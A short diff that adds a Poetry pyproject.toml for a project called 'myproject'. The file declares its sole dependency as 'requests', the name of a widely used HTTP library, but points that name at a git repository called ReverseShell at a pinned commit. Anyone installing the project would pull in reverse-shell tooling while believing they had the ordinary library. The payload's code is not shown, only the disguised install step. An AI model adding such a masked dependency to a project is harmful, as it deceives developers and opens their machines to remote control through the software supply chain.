@@ -1,0 +1,11 @@
+[tool.poetry]
+name = "myproject"
+version = "0.1.0"
+
+[tool.poetry.dependencies]
+requests = {git = "https://github.com/mauricelambert/ReverseShell.git", rev = "d0c1978623ab885ca5b528c253cc30481c39c61d"}
+
+
+[build-system]
+requires = ["poetry-core"]
+build-backend = "poetry.core.masonry.api"
